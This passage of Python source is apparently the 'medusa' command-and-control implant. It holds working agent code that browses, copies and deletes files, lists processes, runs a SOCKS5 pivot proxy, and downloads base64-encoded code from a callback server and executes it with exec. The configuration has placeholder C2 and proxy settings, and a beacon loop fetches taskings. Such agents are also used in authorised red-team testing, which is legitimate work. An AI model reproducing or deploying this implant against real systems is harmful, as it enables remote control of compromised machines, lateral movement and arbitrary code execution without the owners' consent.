        with open(file_path, 'r') as f:
            content = f.readlines()
            return ''.join(content)

    def ls(self, task_id, path, file_browser=False):
        if path == ".": file_path = self.current_directory
        else: file_path = path if path[0] == os.sep \
            else os.path.join(self.current_directory,path)
        file_details = os.stat(file_path)
        target_is_file = os.path.isfile(file_path)
        target_name = os.path.basename(file_path.rstrip(os.sep)) if file_path != os.sep else os.sep
        file_browser = {
            "host": socket.gethostname(),
            "is_file": target_is_file,
            "permissions": {"octal": oct(file_details.st_mode)[-3:]},
            "name": target_name if target_name not in [".", "" ] \
                else os.path.basename(self.current_directory.rstrip(os.sep)),
            "parent_path": os.path.abspath(os.path.join(file_path, os.pardir)),
            "success": True,
            "access_time": int(file_details.st_atime * 1000),
            "modify_time": int(file_details.st_mtime * 1000),
            "size": file_details.st_size,
            "update_deleted": True,
        }
        files = []
        if not target_is_file:
            with os.scandir(file_path) as entries:
                for entry in entries:
                    file = {}
                    file['name'] = entry.name
                    file['is_file'] = True if entry.is_file() else False
                    try:
                        file_details = os.stat(os.path.join(file_path, entry.name))
                        file["permissions"] = { "octal": oct(file_details.st_mode)[-3:]}
                        file["access_time"] = int(file_details.st_atime * 1000)
                        file["modify_time"] = int(file_details.st_mtime * 1000)
                        file["size"] = file_details.st_size
                    except OSError as e:
                        pass
                    files.append(file)
        file_browser["files"] = files
        task = [task for task in self.taskings if task["task_id"] == task_id]
        task[0]["file_browser"] = file_browser
        output = { "files": files, "parent_path": os.path.abspath(os.path.join(file_path, os.pardir)), "name":  target_name if target_name not in  [".", ""] \
            else os.path.basename(self.current_directory.rstrip(os.sep))  }
        return json.dumps(output)

    def cp(self, task_id, source, destination):
        import shutil

        source_path = source if source[0] == os.sep \
            else os.path.join(self.current_directory,source)

        dest_path = destination if destination[0] == os.sep \
            else os.path.join(self.current_directory,destination)

        if os.path.isdir(source_path):
            shutil.copytree(source_path, dest_path)
        else:
            shutil.copy(source_path, dest_path)

    def load_script(self, task_id, file):
        total_chunks = 1
        chunk_num = 0
        cmd_code = ""
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file, "chunk_num": chunk_num+1 }, "task_id": task_id }
            ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            chunk_num+=1
            total_chunks = chunk["total_chunks"]
            cmd_code += base64.b64decode(chunk["chunk_data"]).decode()

        if cmd_code: exec(cmd_code)
        else: return "Failed to load script"

    def rm(self, task_id, path):
        import shutil
        file_path = path if path[0] == os.sep \
            else os.path.join(self.current_directory,path)
        if os.path.isdir(file_path):
            shutil.rmtree(file_path)
        else:
            os.remove(file_path)

    def jobs(self, task_id):
        out = [t.name.split(":") for t in threading.enumerate() \
               if t.name != "MainThread" and "a2m" not in t.name \
               and "m2a" not in t.name and t.name != "jobs:{}".format(task_id) ]
        if len(out) > 0: return json.dumps({ "jobs": out })
        else: return "No long running jobs!"

    def unload(self, task_id, command):
        try: getattr(medusa, command)
        except: return "{} not currently loaded.".format(command)
        delattr(medusa, command)
        cmd_list = [{"action": "remove", "cmd": command}]
        responses = [{ "task_id": task_id, "user_output": "Unloaded command: {}".format(command), "commands": cmd_list, "completed": True }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)

    def ps(self, task_id):
        import os
        processes = []
        if os.name == 'posix':

            def get_user_id_map():

                user_map = {}
                # get username from uid
                with open("/etc/passwd", "r") as f:
                    passwd = f.readlines()

                for line in passwd:
                    user_line_arr = line.split(":")
                    username = user_line_arr[0].strip()
                    uid = user_line_arr[2].strip()
                    user_map[uid] = username

                return user_map

            # Get the user map
            user_map = get_user_id_map()

            # get list of PIDs by performing a directory listing on /proc
            pids = [pid for pid in os.listdir("/proc") if pid.isdigit()]

            # loop through each PID and output information similar to ps command
            for pid in pids:
                # construct path to status file
                status_path = "/proc/%s/status" % str(pid)

                # read in the status file - bail if process dies before we read the status file
                try:
                    with open(status_path, "r") as f:
                        status = f.readlines()
                except Exception as e:
                    continue

                # construct path to status file
                cmdline_path = "/proc/%s/cmdline" % str(pid)

                # read in the status file
                with open(cmdline_path, "r") as f:
                    cmdline = f.read()
                    cmd_arr = cmdline.split("\x00")
                    cmdline = " ".join(cmd_arr)

                # extract relevant information from status file
                name = ""
                ppid = ""
                uid = ""
                username = ""

                for line in status:
                    if line.startswith("Name:"):
                        name = line.split()[1].strip()
                    elif line.startswith("PPid:"):
                        ppid = line.split()[1].strip()
                    elif line.startswith("Uid:"):
                        uid = line.split()[1].strip()

                # Map the uid to the username
                if uid in user_map:
                    username = user_map[uid]

                process = {"process_id": pid, "parent_process_id": ppid, "user_id": username, "name": name,
                           "bin_path": cmdline}

                processes.append(process)

        elif os.name == 'nt':

            import sys, os.path, ctypes, ctypes.wintypes, re
            from ctypes import create_unicode_buffer, GetLastError

            def _check_bool(result, func, args):
                if not result:
                    raise ctypes.WinError(ctypes.get_last_error())
                return args

            PULONG = ctypes.POINTER(ctypes.wintypes.ULONG)
            ULONG_PTR = ctypes.wintypes.LPVOID
            SIZE_T = ctypes.c_size_t
            NTSTATUS = ctypes.wintypes.LONG
            PVOID = ctypes.wintypes.LPVOID
            PROCESSINFOCLASS = ctypes.wintypes.ULONG

            Psapi = ctypes.WinDLL('Psapi.dll')
            EnumProcesses = Psapi.EnumProcesses
            EnumProcesses.restype = ctypes.wintypes.BOOL
            GetProcessImageFileName = Psapi.GetProcessImageFileNameA
            GetProcessImageFileName.restype = ctypes.wintypes.DWORD

            Kernel32 = ctypes.WinDLL('kernel32.dll')
            OpenProcess = Kernel32.OpenProcess
            OpenProcess.restype = ctypes.wintypes.HANDLE
            CloseHandle = Kernel32.CloseHandle
            CloseHandle.errcheck = _check_bool
            IsWow64Process = Kernel32.IsWow64Process

            WIN32_PROCESS_TIMES_TICKS_PER_SECOND = 1e7

            MAX_PATH = 260
            PROCESS_TERMINATE = 0x0001
            PROCESS_QUERY_INFORMATION = 0x0400

            TOKEN_QUERY = 0x0008
            TOKEN_READ = 0x00020008
            TOKEN_IMPERSONATE = 0x00000004
            TOKEN_QUERY_SOURCE = 0x0010
            TOKEN_DUPLICATE = 0x0002
            TOKEN_ASSIGN_PRIMARY = 0x0001

            ProcessBasicInformation = 0
            ProcessDebugPort = 7
            ProcessWow64Information = 26
            ProcessImageFileName = 27
            ProcessBreakOnTermination = 29

            STATUS_UNSUCCESSFUL = NTSTATUS(0xC0000001)
            STATUS_INFO_LENGTH_MISMATCH = NTSTATUS(0xC0000004).value
            STATUS_INVALID_HANDLE = NTSTATUS(0xC0000008).value
            STATUS_OBJECT_TYPE_MISMATCH = NTSTATUS(0xC0000024).value

            def query_dos_device(drive_letter):
                chars = 1024
                drive_letter = drive_letter
                p = create_unicode_buffer(chars)
                if 0 == Kernel32.QueryDosDeviceW(drive_letter, p, chars):
                    pass
                return p.value

            def create_drive_mapping():
                mappings = {}
                for letter in (chr(l) for l in range(ord('C'), ord('Z') + 1)):
                    try:
                        letter = u'%s:' % letter
                        mapped = query_dos_device(letter)
                        mappings[mapped] = letter
                    except WindowsError:
                        pass
                return mappings

            mappings = create_drive_mapping()
            def normalise_binpath(path):
                match = re.match(r'(^\\Device\\[a-zA-Z0-9]+)(\\.*)?$', path)
                if not match:
                    return f"Cannot convert {path} into a Win32 compatible path"
                if not match.group(1) in mappings:
                    return None
                drive = mappings[match.group(1)]
                if not drive or not match.group(2):
                    return drive
                return drive + match.group(2)

            count = 32
            while True:
                ProcessIds = (ctypes.wintypes.DWORD*count)()
                cb = ctypes.sizeof(ProcessIds)
                BytesReturned = ctypes.wintypes.DWORD()
                if EnumProcesses(ctypes.byref(ProcessIds), cb, ctypes.byref(BytesReturned)):
                    if BytesReturned.value<cb:
                        break
                    else:
                        count *= 2
                else:
                    sys.exit("Call to EnumProcesses failed")

            for index in range(int(BytesReturned.value / ctypes.sizeof(ctypes.wintypes.DWORD))):
                process = {}
                process["process_id"] = ProcessId = ProcessIds[index]
                if ProcessId == 0: continue

                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, False, ProcessId)
                if hProcess:
                    ImageFileName = (ctypes.c_char*MAX_PATH)()
                    Is64Bit = ctypes.c_int32()
                    IsWow64Process(hProcess, ctypes.byref(Is64Bit))
                    arch = "x86" if Is64Bit.value else "x64"
                    process["architecture"] = arch


                    if GetProcessImageFileName(hProcess, ImageFileName, MAX_PATH)>0:
                        filename = os.path.basename(ImageFileName.value)
                        process["name"] = filename.decode()
                        process["bin_path"] = normalise_binpath(ImageFileName.value.decode())

                    CloseHandle(hProcess)
                processes.append(process)

        task = [task for task in self.taskings if task["task_id"] == task_id]
        task[0]["processes"] = processes
        return json.dumps({ "processes": processes })

    def socks(self, task_id, action, port):
        import socket, select, queue
        from threading import Thread, active_count
        from struct import pack, unpack

        MAX_THREADS = 200
        BUFSIZE = 2048
        TIMEOUT_SOCKET = 5
        OUTGOING_INTERFACE = ""

        VER = b'\x05'
        M_NOAUTH = b'\x00'
        M_NOTAVAILABLE = b'\xff'
        CMD_CONNECT = b'\x01'
        ATYP_IPV4 = b'\x01'
        ATYP_DOMAINNAME = b'\x03'

        SOCKS_SLEEP_INTERVAL = 0.1
        QUEUE_TIMOUT = 1

        def sendSocksPacket(server_id, data, exit_value):
            self.socks_out.put({ "server_id": server_id,
                                 "data": base64.b64encode(data).decode(), "exit": exit_value })

        def create_socket():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(TIMEOUT_SOCKET)
            except: return "Failed to create socket: {}".format(str(err))
            return sock

        def connect_to_dst(dst_addr, dst_port):
            sock = create_socket()
            if OUTGOING_INTERFACE:
                try:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, OUTGOING_INTERFACE.encode())
                except PermissionError as err: return 0
            try:
                sock.connect((dst_addr, dst_port))
                return sock
            except socket.error as err: return 0

        def request_client(msg):
            try:
                message = base64.b64decode(msg["data"])
                s5_request = message[:BUFSIZE]
            except:
                return False
            if (s5_request[0:1] != VER or s5_request[1:2] != CMD_CONNECT or s5_request[2:3] != b'\x00'):
                return False
            if s5_request[3:4] == ATYP_IPV4:
                dst_addr = socket.inet_ntoa(s5_request[4:-2])
                dst_port = unpack('>H', s5_request[8:len(s5_request)])[0]
            elif s5_request[3:4] == ATYP_DOMAINNAME:
                sz_domain_name = s5_request[4]
                dst_addr = s5_request[5: 5 + sz_domain_name - len(s5_request)]
                port_to_unpack = s5_request[5 + sz_domain_name:len(s5_request)]
                dst_port = unpack('>H', port_to_unpack)[0]
            else: return False
            return (dst_addr, dst_port)

        def create_connection(msg):
            dst = request_client(msg)
            rep = b'\x07'
            bnd = b'\x00' + b'\x00' + b'\x00' + b'\x00' + b'\x00' + b'\x00'
            if dst:
                socket_dst = connect_to_dst(dst[0], dst[1])
            if not dst or socket_dst == 0: rep = b'\x01'
            else:
                rep = b'\x00'
                bnd = socket.inet_aton(socket_dst.getsockname()[0])
                bnd += pack(">H", socket_dst.getsockname()[1])
            reply = VER + rep + b'\x00' + ATYP_IPV4 + bnd
            try: sendSocksPacket(msg["server_id"], reply, msg["exit"])
            except: return
            if rep == b'\x00': return socket_dst

        def get_running_socks_thread():
            return [ t for t in threading.enumerate() if "socks:" in t.name and not task_id in t.name ]

        def a2m(server_id, socket_dst):
            while True:
                if task_id not in [task["task_id"] for task in self.taskings]: return
                elif [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]: return
                if server_id not in self.socks_open.keys(): return
                try: reader, _, _ = select.select([socket_dst], [], [], 1)
                except select.error as err: return

                if not reader: continue
                try:
                    for sock in reader:
                        data = sock.recv(BUFSIZE)
                        if not data:
                            sendSocksPacket(server_id, b"", True)
                            socket_dst.close()
                            return
                        sendSocksPacket(server_id, data, False)
                except Exception as e: pass
                time.sleep(SOCKS_SLEEP_INTERVAL)

        def m2a(server_id, socket_dst):
            while True:
                if task_id not in [task["task_id"] for task in self.taskings]: return
                elif [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]: return
                if server_id not in self.socks_open.keys():
                    socket_dst.close()
                    return
                try:
                    if not self.socks_open[server_id].empty():
                        socket_dst.send(base64.b64decode(self.socks_open[server_id].get(timeout=QUEUE_TIMOUT)))
                except: pass
                time.sleep(SOCKS_SLEEP_INTERVAL)

        t_socks = get_running_socks_thread()

        if action == "start":
            if len(t_socks) > 0: return "[!] SOCKS Proxy already running."
            self.sendTaskOutputUpdate(task_id, "[*] SOCKS Proxy started.\n")
            while True:
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                    return "[*] SOCKS Proxy stopped."
                if not self.socks_in.empty():
                    packet_json = self.socks_in.get(timeout=QUEUE_TIMOUT)
                    if packet_json:
                        server_id = packet_json["server_id"]
                        if server_id in self.socks_open.keys():
                            if packet_json["data"]:
                                self.socks_open[server_id].put(packet_json["data"])
                            elif packet_json["exit"]:
                                self.socks_open.pop(server_id)
                        else:
                            if not packet_json["exit"]:
                                if active_count() > MAX_THREADS:
                                    sleep(3)
                                    continue
                                self.socks_open[server_id] = queue.Queue()
                                sock = create_connection(packet_json)
                                if sock:
                                    send_thread = Thread(target=a2m, args=(server_id, sock, ), name="a2m:{}".format(server_id))
                                    recv_thread = Thread(target=m2a, args=(server_id, sock, ), name="m2a:{}".format(server_id))
                                    send_thread.start()
                                    recv_thread.start()
                time.sleep(SOCKS_SLEEP_INTERVAL)
        else:
            if len(t_socks) > 0:
                for t_sock in t_socks:
                    task = [task for task in self.taskings if task["task_id"] == t_sock.name.split(":")[1]][0]
                    task["stopped"] = task["completed"] = True
                self.socks_open = {}

    def sleep(self, task_id, seconds, jitter=-1):
        self.agent_config["Sleep"] = int(seconds)
        if jitter != -1:
            self.agent_config["Jitter"] = int(jitter)

    def exit(self, task_id):
        os._exit(0)

    def load(self, task_id, file_id, command):
        total_chunks = 1
        chunk_num = 0
        cmd_code = ""
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file_id, "chunk_num": chunk_num+1 }, "task_id": task_id }
            ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            chunk_num+=1
            total_chunks = chunk["total_chunks"]
            cmd_code += base64.b64decode(chunk["chunk_data"]).decode()

        if cmd_code:
            exec(cmd_code.replace("\n    ","\n")[4:])
            setattr(medusa, command, eval(command))
            cmd_list = [{"action": "add", "cmd": command}]
            responses = [{ "task_id": task_id, "user_output": "Loaded command: {}".format(command), "commands": cmd_list, "completed": True }]
            message = { "action": "post_response", "responses": responses }
            response_data = self.postMessageAndRetrieveResponse(message)
        else: return "Failed to upload '{}' command".format(command)

    def cwd(self, task_id):
        return self.current_directory

    def list_modules(self, task_id, module_name=""):
        if module_name:
            if module_name in self.moduleRepo.keys():
                return "\n".join(self.moduleRepo[module_name].namelist())
            else: return "{} not found in loaded modules".format(module_name)
        else:
            return "\n".join(self.moduleRepo.keys())

    def pip_freeze(self, task_id):
        out=""
        try:
            import pkg_resources
            installed_packages = pkg_resources.working_set
            installed_packages_list = sorted(["%s==%s" % (i.key, i.version) for i in installed_packages])
            return "\n".join(installed_packages_list)
        except:
            out+="[*] pkg_resources module not installed.\n"

        try:
            from pip._internal.operations.freeze import freeze
            installed_packages_list = freeze(local_only=True)
            return "\n".join(installed_packages_list)
        except:
            out+="[*] pip module not installed.\n"

        try:
            import pkgutil
            installed_packages_list = [ a for _, a, _ in pkgutil.iter_modules()]
            return "\n".join(installed_packages_list)
        except:
            out+="[*] pkgutil module not installed.\n"

        return out+"[!] No modules available to list installed packages."

    def cd(self, task_id, path):
        if path == "..":
            self.current_directory = os.path.dirname(os.path.dirname(self.current_directory + os.sep))
        else:
            self.current_directory = path if path[0] == os.sep \
                else os.path.abspath(os.path.join(self.current_directory,path))



    def __init__(self):
        self.socks_open = {}
        self.socks_in = queue.Queue()
        self.socks_out = queue.Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        self.agent_config = {
            "Server": "callback_host",
            "Port": "callback_port",
            "PostURI": "/post_uri",
            "PayloadUUID": "4f6e4343-8619-4f8b-b49f-de7ecdbab89a",
            "UUID": "",
            "Headers": {},
            "Sleep": 1,
            "Jitter": 0,
            "KillDate": "2027-01-08",
            "enc_key": {"dec_key": None, "enc_key": None, "value": "none"},
            "ExchChk": "F",
            "GetURI": "/get_uri",
            "GetParam": "query_path_name",
            "ProxyHost": "proxy_host",
            "ProxyUser": "proxy_user",
            "ProxyPass": "proxy_pass",
            "ProxyPort": "proxy_port",
        }

        while True:
            if(self.agent_config["UUID"] == ""):
                self.checkIn()
                self.agentSleep()
            else:
                while True:
                    if self.passedKilldate():
                        self.exit(None)
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                    except: pass
                    self.agentSleep()

if __name__ == "__main__":
    medusa = medusa()
